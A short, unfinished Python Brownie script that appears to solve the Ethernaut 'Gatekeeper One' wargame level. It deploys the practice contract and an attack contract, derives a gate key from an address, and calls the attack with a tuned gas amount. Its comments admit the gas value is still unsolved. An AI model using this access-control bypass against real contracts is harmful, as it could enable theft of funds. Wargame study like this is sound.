from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack13, GatekeeperOne

""" 
    Goal is to simulate Ethernaut level-13 'Gatekeeper One'
    using Ganache(?) as the first network - update config.yaml
    ...
"""

# --->  work this out and use a for loop to run through the gas amount  <---

ETHERNAUT_INSTANCE = "0x52D9172066F788070Ca1F74A26F3aD2902282c37"
ORIGIN = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
GATE_HEX = "eE25"
GAS_LIMIT = 6000000

# need to figure out exact gas amount to leave -> gasleft() % 8191 == 0
GAS_AMOUNT = 8191


def main():

    player = get_account()
    contract = GatekeeperOne.deploy({"from": player})
    target = contract.address
    print(f"\ntarget address = {target}\n")
    attack = Attack13.deploy(target, {"from": player})
    print(f"\nAttack12 deployed at address = {attack.address}\n")

    gate_key = int(GATE_HEX, 16)  # gate_key = 60965
    print(f"\nGate Key = {gate_key}\n")

    i = 1
    attack.attack(gate_key, (GAS_AMOUNT * 3) + i)
